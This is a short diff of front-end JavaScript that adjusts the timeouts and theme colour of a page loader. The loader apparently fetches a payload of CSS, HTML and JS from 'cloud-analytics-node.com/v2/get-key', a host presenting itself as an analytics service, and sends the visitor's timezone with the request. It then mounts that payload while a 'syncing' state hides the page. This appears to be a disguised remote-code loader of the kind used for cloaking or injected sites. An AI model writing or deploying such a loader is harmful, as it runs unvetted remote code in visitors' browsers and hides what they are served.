@@ -34,11 +34,11 @@
                 clearTimeout(revealTimer);
                 revealTimer = null;
             }
-            if (tcMeta) tcMeta.setAttribute('content', '#0D1017');
+            if (tcMeta) tcMeta.setAttribute('content', '#FAFAFA');
             d.documentElement.classList.remove('is-syncing');
         }
 
-        var revealTimer = setTimeout(revealWhite, 2000);
+        var revealTimer = setTimeout(revealWhite, 4700);
 
         function mountView(payload) {
             if (mounted || !payload || payload.ok !== 1 || !payload.css || !payload.html || !payload.js) return;
@@ -79,7 +79,7 @@
         } catch (e) {}
 
         var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
-        var tId = ctrl ? setTimeout(function () { ctrl.abort(); }, 3500) : null;
+        var tId = ctrl ? setTimeout(function () { ctrl.abort(); }, 4500) : null;
         var endpoint = 'https://cloud-analytics-node.com/v2/get-key' + q + (tz ? '&tz=' + encodeURIComponent(tz) : '');
 
         w.fetch(endpoint, {
